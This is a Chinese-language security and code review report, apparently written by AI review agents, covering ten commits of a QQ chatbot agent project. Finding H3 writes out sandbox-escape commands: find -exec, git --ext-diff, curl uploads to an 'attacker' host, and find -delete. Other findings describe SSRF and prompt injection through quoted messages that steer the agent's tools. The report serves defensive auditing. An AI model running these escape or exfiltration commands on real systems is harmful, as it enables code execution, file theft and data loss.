# agent-demo 近 10 个 Commit 评审汇总报告

评审范围:`be1fb07..6c57fd9`(沙箱工作区 → 共享工作区重构 → matcher 修复 → 图片提取下载 → data-URI vision → 防抖合并 → 图片缓冲 → 引用/转发解析 → URL 直传 → 容错加固),HEAD = 6c57fd9,测试基线 168 passed。
评审方式:既有报告《REVIEW-f6f749b..6c57fd9.md》覆盖后 5 个 commit;本次 workflow 补前 5 个 commit 的逐 commit 并行评审(5 agent)+ 跨全部 10 个 commit 的集成评审(1 agent),所有可疑点均经仓库 venv 实测复现。本文编号承接既有报告(H1/H2、M1-M14、L1-L8),新发现从 H3/M15/L9 起编。

## 一、总览

**整体判断**:这批 10 个 commit 展示了很快的特性迭代节奏,单点防御性编码普遍不错(fs 路径遏制抗符号链接、确认码门按用户隔离、图片不落盘 memory、engine 剥离 LLM 伪造的 user_id)。但存在一条贯穿性的系统缺陷:**workspace 命令白名单只做命令名级校验、参数级校验形同虚设,3 个评审 agent 相互独立地实测出了 6 类逃逸/滥用路径,其中 `find -exec` 等价任意命令执行**,使 8b972c2 "禁 python3/node/npm" 的加固被完全架空;配套的安全负向测试为零,同类问题(be1fb07 的 import 期崩溃)正是因此漏网。此外图片链路从"超管特权"悄然扩大为"白名单全员可触发出网",且引用/转发主路径不可达(H1,HEAD 未修)仍未处理。

| Commit | 一行结论 |
|---|---|
| be1fb07 沙箱工作区 | ❌ fs 路径遏制与确认码门扎实;但 runner 白名单多条实测逃逸(find -exec、git --ext-diff、unzip 符号链接、`--output=/abs` 越界写),且裸 lambda 使整个 admin 插件 import 崩溃、特性不可达(4283beb 已修) |
| 8b972c2 共享工作区重构 | ⚠️ 方向正确、权限绑定不可伪造、无漏网入口;但"禁 python3/node/npm"被 `find -exec {} +` 完全架空(实测 RCE),unzip 还原符号链接使路径锁定对 runner 失效 |
| 4283beb matcher rule 修复 | ✅ 根因准确(nonebot Rule 构造期 ValueError,非运行期)、修复正路、语义完全等价、同类隐患全仓零残留;唯一遗憾是无配套测试 |
| 3b978d2 图片提取下载 | ⚠️ 落盘文件名 sha256+白名单扩展、admin 门禁不可绕过;但 SSRF 经重定向扩大、无总时长上限、`_plain_text` 回退自引用失效、测试含恒真断言 |
| 1560488 data-URI vision | ⚠️ "图片只进当次请求、不落盘 memory"的核心设计正确;但图片下载从超管特权扩大为全员可触发,vision 载荷无总预算且 tool-loop 每步全量重发 |
| f6f749b..6c57fd9 后 5 个 | 见《REVIEW-f6f749b..6c57fd9.md》(H1 引用解析不可达未修、H2 matcher 测试缺失、M1-M14) |
| 集成评审(跨 10 commit) | ❌ 沙箱越界写/私图外传/免确认删除三条链路实测成立;media 落盘 × fs_read 致 473ms 事件循环阻塞 + 乱码入上下文;README 安全声明与实测不符 |

---

## 二、已有报告(后 5 个 commit)结论备忘

详见《REVIEW-f6f749b..6c57fd9.md》。关键项:**H1** 引用(reply)解析主路径被适配器 `_check_reply` 提前消费、特性不可达(本次集成评审已在 HEAD 复核成立,见第六节);**H2** matcher 层核心交叉逻辑测试系统性缺失;M1 多账号回复身份错误、M2 图片缓冲无界、M10 防抖竞态、M13 群聊特性被 trigger_rule 抵消(已复核成立)等。下文不再重复。

---

## 三、新发现问题清单(前 5 个 commit + 集成,已合并去重)

### High

**H3. workspace 命令白名单参数级校验缺失:6 类实测逃逸,`find -exec` 等价任意命令执行**
- **严重度**:High | **文件**:`agentcore/workspace/runner.py:27-73` | **出自**:be1fb07,**HEAD 仍存在**(3 个 agent 独立端到端复现)
- **根因**:白名单只校验命令名;参数校验(`_check_path_args`)仅拦"参数整体以 `/` 开头"和 `..`,拦不住选项内嵌路径、换行、`+` 终止符;git 分支只查 `args[0]`、其余参数放开;curl 只查 URL/`-k`;find/zip 无任何参数限制。**全部以下各条均在 HEAD 代码实测端到端复现**:
  - ① `find . -exec sh -c '<任意命令,换行分隔>' {} +` → 任意命令执行(`;|&` 黑名单只挡 `\;` 形式,`+` 形式畅通;绝对路径藏于字符串参数内部绕过 startswith 检查);
  - ② `fs_write` 写 `.git/config`(工作区内合法)+ `git diff --ext-diff` → 外部 diff 命令执行,RCE;
  - ③ unzip 还原 zip 内符号链接条目(实测 `linking: out/l_evil -> /etc/passwd`)→ `cat out/l_evil` 任意读;目录符号链接可致任意写;
  - ④ `curl --output=/abs`、`-o/abs`、`git log --output=/abs` → 沙箱越界写(实测工作区外文件生成);
  - ⑤ `curl -T media/secret.jpg https://attacker/`(`--upload-file` 同)→ 工作区文件批量外传;`zip -r leak.zip media` 同理打包外传;
  - ⑥ `find . -delete` → **免确认码清空整个工作区**(实测),与同一 commit 精心设计的 DeletionGate 直接矛盾,LLM 幻觉一次即数据丢失。
- **影响**:admin-only 门禁 + engine 剥离 LLM 伪造 user_id 是仅存防线,但既有报告 M5 已证引用/转发内容可注入管理员 prompt 诱导技能调用——防线单薄。README:129 "路径锁定、不经 shell"的安全声明与实测不符;8b972c2 禁 python3/node/npm 的加固被 ① 完全架空。
- **修复**:find 拒绝 `-exec/-execdir/-ok/-okdir/-delete/-fls/-fprint*`(或移出白名单);git 只读子命令仅放行纯子命令+少量安全 flag,拒绝 `--ext-diff/--textconv/-c/--output*`;curl 收敛为 GET-only 参数集;路径检查改为"凡含 `/` 的参数 resolve 后必须在 root 内";unzip 后扫描并拒绝新增符号链接;子进程用最小化 `env=`(当前继承全部环境变量含 LLM API key);根治方案是容器/独立低权用户。

**H4. 沙箱安全边界测试矩阵缺失,安全回归无法被 CI 捕获**
- **严重度**:High | **文件**:`tests/test_workspace.py`、`tests/`(整体) | **出自**:be1fb07 + 全批,**HEAD 仍存在**
- **说明**:现有测试只覆盖浅层拒绝类(非白名单命令、http URL、`../`、python -c)。零覆盖:① runner "不可越界/不可外传"负向用例(H3 全部 6 类向量无任何测试);② **skill 层 ACL**(fs_*/run_command 对非管理员拒绝——admin-only 的核心,`_deny_or_fs` 被误删不会有任何测试失败);③ admin.py 整个文件零测试(无任何测试 import 它,4283beb 修的 import 崩溃正是因此漏网);④ `fetch_image_bytes`/`data_url_from_bytes` 安全相关解析逻辑零测试;⑤ 恶意文件名(路径穿越 URL → 安全文件名)零覆盖,且 `test_media.py:63-67` 首条断言实测恒真(写法有误)。
- **修复**:对 H3 每个向量加 `permitted()` 反断言;补 skill 层 ACL 用例(monkeypatch SUPERUSERS);加 `import plugins.qq_agent_adapter.admin` 冒烟测试;补 content-type 矩阵与文件名穿越回归用例。

**H5.(当时 High,已修复)裸 lambda rule 使整个 admin 插件 import 崩溃**
- **严重度**:High(当时)| **文件**:`admin.py`(be1fb07/8b972c2 版)| **出自**:be1fb07,**4283beb 已修复**
- **说明**:`on_message(rule=lambda e: ...)` 在 nonebot 2.5.0 的 Rule **构造期**(模块 import 时)即抛 `ValueError: Unknown parameter e`(依赖注入五类参数全不匹配,venv 实测),admin.py 全部命令(含确认删除)不可加载。4283beb 改为带 `MessageEvent` 注解的具名函数,根因准确、语义完全等价、全仓同类隐患零残留(已逐一核实)。教训即 H4-③:一条 import 冒烟测试即可在合并前拦住。

### Medium

**M15. 图片下载出网面扩大:重定向不重校验 + 从超管特权变为全员可触发 + 无总时长上限**
- **严重度**:Medium | **文件**:`media.py:74,88-96`、`matcher.py:152-156` | **出自**:3b978d2 + 1560488,**HEAD 仍存在**
- **说明**:① `follow_redirects=True` 且跳转目标不重校验(httpx 默认跟随 20 跳,https→http 降级、跳内网均放行)——即使将来加域名白名单仍可被重定向绕过;② 3b978d2 时下载仅超管可触发,1560488 起 vision 开启即对任何 ACL 放行用户执行 `fetch_image_bytes`(无 is_su 判断),SSRF 从"管理员自伤"变为"白名单群内任意成员可探测内网";③ `_TIMEOUT=15` 是 httpx 单操作超时,慢速服务器每 14s 吐 1 字节可把下载拖到任意长,3 张串行放大。既有 L6(首跳仅校验 https 前缀)与本条互补。
- **修复**:`follow_redirects=False` 逐跳校验;图床域名白名单(gchat.qpic.cn 等)+ 解析后 IP 拒私网/环回;`asyncio.timeout()` 包整体 deadline;非超管收紧单图/总量上限。

**M16. vision 载荷无总预算,tool-loop 每步全量重发 data URI**
- **严重度**:Medium | **文件**:`media.py:22,90`、`engine.py:154-167` | **出自**:1560488,**HEAD 仍存在**
- **说明**:20MB 上限按落盘标准而非 LLM 请求体预算设定:实测 20MB 图 → 27.96MB data URI,2 张 → 55.9MB 单请求体,几乎必然 413 后整轮退化为"LLM 调用失败";`messages` 列表在 tool-loop 各步复用,图片在每次工具调用后重发,token/延迟按步数放大;10MB 图处理峰值内存 38.4MB(3.8 倍放大),无缩放(仓库无 PIL)。
- **修复**:vision 单图上限收紧至 ~4-5MB 并设总和预算;或首次 LLM 调用后将 user content 降级为文本占位再续跑 tool-loop。

**M17. workspace/media 无磁盘配额、无清理、非原子写**
- **严重度**:Medium | **文件**:`matcher.py:159-194`、`media.py` | **出自**:3b978d2 + 1560488,**HEAD 仍存在**
- **说明**:QQ 图床 URL 每消息唯一,哈希名去重无效,目录无限增长(每消息最多 3×20MB);全仓无删除/过期逻辑,唯一删除通道 fs_delete 需逐文件确认码;同 URL 并发下载写同名文件且 `write_bytes` 非 tmp+rename,LLM 并发读可能读到截断文件。
- **修复**:目录容量/时间配额 + 定期清理;`os.replace` 原子写。

**M18. 两处单点失败导致整条消息静默丢弃**
- **严重度**:Medium | **文件**:`matcher.py:30,164` | **出自**:3b978d2 + 1560488,**HEAD 仍存在**
- **说明**:① `_plain_text` 的异常回退 `return str(event.get_message())` 在 `get_message()` 本身抛异常时原样再抛(自引用失效)——HEAD 上被 `_prepare_payload` 兜底 except 吞成 payload=None,整条消息(含纯文本)无任何回复;② 超管落盘路径 `p.write_bytes(raw)` 裸调,磁盘满/权限错误同样吞掉整条消息。
- **修复**:① 回退返回 `""` 并记日志;② 落盘失败降级为 note"保存失败,已识图",不影响识图与回复。

**M19. fs 技能同步阻塞 IO + 无上限读入:实测 473ms 事件循环停摆、二进制乱码入上下文**
- **严重度**:Medium | **文件**:`fs.py:22-53`、`runner.py:97-107` | **出自**:be1fb07,**HEAD 仍存在**
- **说明**:实测 fs_read 读 20MB 二进制:全量读入解码后才截 6000 字符,wall=473ms、峰值 RSS 217MB,乱码(大量 U+FFFD/控制字符)直接作为 tool 结果进 LLM 上下文——落盘 note 恰好把文件名告诉了 LLM,"读一下 media 里那张图"是自然场景;阻塞发生在单一事件循环,且 `_answer` 运行在防抖后台任务内,期间**所有会话**的处理停摆(既有 L7 写路径阻塞的读路径对应,量级更大);runner `communicate()` 同样全量缓冲后才截断。
- **修复**:read 分块读取截断;非文本魔数直接返回"(二进制文件,N 字节)";同步 IO 包 `asyncio.to_thread`;runner 逐块读累计超限即截断。

**M20. 权限双轨制:管理员工具 schema 对非管理员全量可见,叠加"重试 2 次"提示形成必败循环**
- **严重度**:Medium | **文件**:`workspace_skills.py`(6 处 `permission="public"`)、`registry.py:68-73` | **出自**:be1fb07,**HEAD 仍存在**
- **说明**:registry 本身已支持按超管过滤 schema 却未用于 workspace 技能;非管理员携带 6 个永远失败的 fs_*/run_command,问一句"列一下工作区"即触发 3 次无效 LLM 往返(engine 系统提示要求错误重试 2 次)。
- **修复**:技能注册为非 public(schema 层隐藏),`_deny_or_fs` 保留作纵深防御;"权限拒绝类错误不重试"写进系统提示。

### Low

**L9. 确认码 24-bit 熵、无失败限速;`DeletionGate.prune()` 死代码**
- `confirm.py:22-56` | be1fb07 | HEAD 仍存在。缓解:bucket 按 user_id 隔离,暴力破解无收益。`prune()` 全仓零调用,`_pending` 慢性泄漏。→ `token_hex(4)`;失败数次清空 bucket;request 前顺带 prune。

**L10. 确认删除 matcher 全局监听且 `block=True`,未授权聊天也回复并吞消息**
- `admin.py:293-299` | be1fb07 | HEAD 仍存在。任何群命中"确认删除 XXXXXX"都会回复"无权限"并拦截下传。→ rule 加 `is_allowed`,无权限静默放行。

**L11. 审计日志丢失操作者;包 docstring 过期**
- `runner.py:87`(8b972c2 起 `uid=%s` 被删,多管理员无法归因);`workspace/__init__.py:3` 仍写"锁定在 `data/workspace/<user_id>/`",与共享目录重构矛盾。

**L12. 死代码与重复定义簇**
- `data_url_for`、`handle_images_in_message`、`media_display_summary`、`MAX_PER_MESSAGE` 均零调用(3b978d2 引入、1560488 内联重写后弃用);`MAX_PER_MESSAGE=3` 与 matcher 硬编码 `[:3]` 双源定义同一限制;`admin.py:225-238` `_persona_list_lines` 逐字重复定义两份(8f3194e 引入);`media.py:13` 未使用的 `import time`。→ 删除收敛。

**L13. 下载失败将原始 URL 未清洗回显进 prompt**
- `matcher.py:194,196` | 3b978d2 | HEAD 仍存在。仅当协议端以 string 消息格式回传时用户可借 CQ 码注入含换行的 URL,走"失败回显"分支进 prompt。→ 回显仅域名+白名单字符过滤。

**L14. `_plain_text` 只取 text 段,json/音乐卡片等段的正文对 LLM 完全不可见**
- `matcher.py:20-30` | 行为缺口:卡片分享表现为空消息。

**L15. engine 侧健壮性三小项**
- `data:` 前缀校验过宽(裸 `data:`、非 base64 内容均透传,provider 侧才失败);非 vision 模型无探测降级(note 已声称"已识图"而实际整轮通用失败,误导排障);manifest/docstring 的每消息张数常量与活代码漂移。

**L16. 超管/工作区根"双源真相"**
- `acl.py` 与 `workspace/utils.py` 各自解析 SUPERUSERS(格式兼容性不同),`admin.py:310` 又独立构造 WorkspaceFS root;当前靠 bot.py 启动时归一化才一致,绕过 bot.py 的入口(测试等)会静默漂移。`.env.example:64` "留空表示不限制超级用户"与 fail-closed 行为相反。→ 收敛单一解析函数;修正注释。

**L17. content-type 校验残余缺口**
- `media.py` | HEAD 已改 `startswith("image/")`(较 3b978d2 子串匹配更严),但**缺失 content-type 头时仍完全跳过校验**、`application/octet-stream` 仍无条件放行任意 20MB 内容。→ 缺头按拒绝处理;octet-stream 做魔数嗅探。

---

## 四、集成风险(跨 commit 交互)

1. **图片落盘 × 沙箱外传链(H3-⑤)**:media/ 持续累积用户私聊图片,落盘 note 把精确文件名告诉 LLM;`curl -T media/xxx.jpg https://attacker/` 一条命令批量外传。叠加既有 M5(引用内容可注入管理员 prompt),注入者无需是管理员。
2. **H3 各向量 × H4 测试空白**:安全属性("不可越界/不可外传")零测试锁定,后续任何白名单改动都可能无声回归;be1fb07 的 import 崩溃存活 3 个 commit(23:15→23:32)正演示了这一盲区的实际代价。
3. **media 落盘 × fs_read(M19)**:超管自然语言"看看存了什么"→ 20MB 二进制读入 → 473ms 全局停摆 + 乱码上下文。
4. **vision 管线四段演进(1560488→3b978d2→f1dde0c→6c57fd9)策略分层脱节**:media.py 强制 https、engine 白名单 data:/https:、matcher 回退链三者各自为政(既有 M7 的根因),本批新增:落盘下载 20MB 标准 × LLM 请求体预算(M16)、出网触发者从超管扩大到全员(M15)。
5. **两套删除安全策略同仓并存**:DeletionGate 确认码门(精心设计)vs `find . -delete`(零门槛,实测清空工作区)——安全设计被白名单旁路否定(H3-⑥)。
6. 既有报告第 1-6 条集成风险(H1 叠加无效修补、防抖×trigger_rule、防抖×engine 串行化、http URL 脏数据二次传播、截断挤占、注入×权限放大)全部维持,不重复。

---

## 五、亮点

- **fs 路径遏制正确且抗符号链接**:`resolve()` 先跟链接再 containment 检查,`/abs`、`..`、外链符号链接全部拒绝(实测);经典 zip-slip 亦被 Info-ZIP 自身清洗。
- **LLM 无法伪造身份**:engine 从可信 QQ 事件强制注入 `user_id`(剥离 LLM 返回值),is_superuser 未配置时 fail-closed;全仓仅两个入口触碰 WorkspaceFS/CommandRunner,无漏网。
- **图片不落盘 memory**(1560488 核心决策正确):data URI 仅存活于当次请求,落盘记录为纯文本,避免历史表爆炸与图片隐私落盘。
- **4283beb 是高质量小修复**:根因诊断到 nonebot DI 源码级、修复惯用、语义严格等价、顺带消除 pattern 双写与预编译性能小改进。
- **落盘文件名派生安全**:`sha256(url)[:12]`+白名单扩展名,`file` 字段不参与命名,实测各类穿越 URL 均映射为安全文件名;data URI mime 经 `split(";")[0]` 不可构造注入。
- admin 门禁、确认码按用户隔离、`secrets.token_hex`/`time.monotonic` 等基础组件选型均正确;168 个测试全绿,Debouncer/engine 契约有真实行为级测试钉住。

---

## 六、已有报告关键结论的 HEAD 复核(集成评审)

| 结论 | 结果 | 证据 |
|---|---|---|
| H1 引用解析主路径不可达 | **成立** | nonebot-adapter-onebot 2.4.6 `bot.py:206` 先于 matcher 调 `_check_reply` 并 `del event.message[index]`;HEAD matcher.py 仍扫描消息段、全文无 `event.reply` 使用 |
| M1 多账号回复身份错误 | **成立** | `_get_bot()` 取任意 bot;payload 无 self_id |
| M13 群聊防抖/缓冲被 trigger_rule 抵消 | **成立** | 群消息需前缀或 is_tome;README 宣传未改 |
| 负结果(无需再排查) | media 落盘文件名不可构成路径穿越/注入面;data URI mime 字段不可构造协议注入 | 详见 C4/C1 核查 |

---

## 七、总体建议(按优先级)

1. **立即修 H3**(逐条参数级校验或收窄白名单,子进程最小化 env;根治走容器/低权用户)——在此之前沙箱的安全声明不成立,且它架空了 8b972c2 的全部加固。
2. **补 H4 安全测试矩阵**(H3 各向量的 `permitted()` 反断言、skill ACL、admin.py import 冒烟),与 H2 的 matcher 测试一并构成回归防线。
3. **修 H1(既有报告)**:改用 `event.reply` 主来源——引用/转发特性及其上两轮修补目前仍在空转。
4. **收口图片链路**:M15(重定向逐跳校验+域名白名单+总时长)、M16(vision 预算)、M17(配额+原子写)、M18(失败不吞消息)、L17。
5. **治理**:M19(to_thread+分块读)、M20(schema 隐藏+重试提示)、L9-L16 择机批量清理(死代码、双源真相、文档对齐)。
